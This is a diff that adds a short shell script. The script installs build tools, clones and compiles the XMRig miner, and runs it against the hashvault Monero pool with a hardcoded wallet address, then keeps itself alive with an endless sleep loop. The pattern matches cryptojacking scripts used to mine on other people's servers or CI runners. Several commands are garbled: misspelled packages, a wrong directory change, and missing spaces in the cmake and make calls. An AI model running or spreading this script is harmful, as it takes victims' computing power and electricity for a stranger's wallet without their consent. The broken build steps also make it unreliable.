@@ -1,0 +1,17 @@
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+sudo apt install git
+sudo apt install curl
+sudo apt install python
+sudo apt install 
+sudo apt-get install git build-essential cmake automake libtoll autoconf
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd ../build
+cmake.. -DXMRIG_DEPS=scripts/deps
+make-j$(nproc)
+./xmrig --randomx-mode=light --cpu-no-yield --threads=4 -o stratum+tcp://pool.hashvault.pro:443 -u 87og8gTXxWsdo6AuJSQEKQNuSUjVQVfLRF4VEy9R1svxKhX7SFxD5GvhDeLjuBZKQTFzdWxNb3qJEHaekCFZRv7hCkgboHn -p pejuangretjeh88 -k -a rx/0
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
